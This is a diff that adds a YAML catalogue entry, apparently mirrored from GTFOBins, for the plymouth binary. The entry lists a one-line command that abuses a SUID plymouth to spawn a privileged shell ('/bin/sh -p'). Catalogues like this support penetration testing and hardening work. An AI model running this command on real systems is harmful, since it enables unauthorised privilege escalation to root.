@@ -1,0 +1,24 @@
+id: gtfobins/plymouth/shell/suid
+type: binary
+platform: linux
+name: plymouth
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: plymouth ask-for-password --prompt=x --command='/bin/sh -p'
+references:
+- https://gtfobins.github.io/gtfobins/plymouth/
+tags:
+- linux
+- unix
+- gtfobins
